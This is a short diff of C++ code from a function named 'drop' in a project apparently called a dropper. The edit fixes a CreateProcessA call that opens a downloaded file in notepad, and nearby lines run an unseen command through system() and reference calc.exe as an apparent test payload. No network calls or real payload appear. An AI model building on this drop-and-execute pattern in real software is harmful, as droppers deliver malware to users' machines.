@@ -276,7 +276,7 @@ void drop(int size, void* buffer)
 
         int result = system(cmd.c_str());
 	std::string notepad_test = "notepad.exe " + downloadsPath;
-	BOOL err = CreateProcessA(nullptr, notepad_test, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	BOOL err = CreateProcessA(nullptr, notepad_test.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	std::cout << "This is result: " << result << "\n";
 
         std::string cmpPath = "C:\\Users\\adind\\Dropper\\Walmart-version-of-Dropper\\Linux_mint_22.3\\FileSystem_exe_rebuild\\calc.exe";
